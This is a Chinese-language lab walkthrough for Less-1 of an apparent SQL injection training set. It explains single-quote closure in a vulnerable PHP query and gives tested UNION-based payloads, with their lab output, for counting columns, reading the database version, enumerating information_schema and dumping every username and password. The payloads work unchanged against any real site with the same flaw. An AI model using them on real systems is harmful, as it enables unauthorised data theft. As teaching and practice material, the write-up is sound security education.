# Less-1

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 报错型 |
| **闭合方式** | `'` |
| **成败信号** | 直接回显 username / password |
| **一句话** | 最经典的字符型注入 |
| **核心 payload** | `?id=-1' union select 1,2,3--+` |

---

**GET · 报错型 · 单引号字符型**

### 源码

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

### 判断闭合方式

先随便给个 `1`，再给个 `1'`：

```
?id=1     →  Your Login name:Dumb     Your Password:Dumb
?id=1'    →  You have an error in your SQL syntax ... near ''1'' LIMIT 0,1' at line 1
```

`1'` 报错说明单引号**没有被转义**，它闭合了原来那个 `'`，导致引号不配对。

### 闭合原理

```
原句：SELECT * FROM users WHERE id='$id' LIMIT 0,1
输入：1'
结果：SELECT * FROM users WHERE id='1'' LIMIT 0,1
                                  ↑ 多出一个引号，语法错误
```

只要把后面的东西注释掉就恢复正常：

```
输入：1' --+
结果：SELECT * FROM users WHERE id='1' --+ LIMIT 0,1
                                       ↑ 后面全被注释
```

### 通关 payload（实测）

**① 判断列数**
```
?id=1' order by 3--+     →  正常显示 Dumb
?id=1' order by 4--+     →  Unknown column '4' in 'order clause'
```
→ 3 列

**② 找显示位**
```
?id=-1' union select 1,2,3--+
```
实测输出：`user=2  pass=3` → 第 2、3 列会显示

**③ 拿库名和版本**
```
?id=-1' union select 1,database(),version()--+
```
实测输出：`user=security  pass=5.7.26`

**④ 一次拖出全部账号密码**
```
?id=-1' union select 1,2,group_concat(username,0x3a,password) from users--+
```
实测输出（13 条）：

```
Dumb:Dumb, Angelina:I-kill-you, Dummy:p@ssword, secure:crappy,
stupid:stupidity, superman:genious, batman:mob!le, admin:admin,
admin1:admin1, admin2:admin2, admin3:admin3, dhakkan:dumbo, admin4:admin4
```

### 遇到查不到表名怎么办

`information_schema` 是 MySQL 自带的元数据库，但里面有几百个无关的库。用 `table_schema=database()` 过滤：

```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
→ emails,referers,uagents,users

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
→ id,username,password
```
> `0x7573657273` 是 `users` 的十六进制写法。用十六进制是为了绕开引号，属于习惯操作。

---

— ｜ [返回目录](README.md) ｜ [Less-2 →](Less-02.md)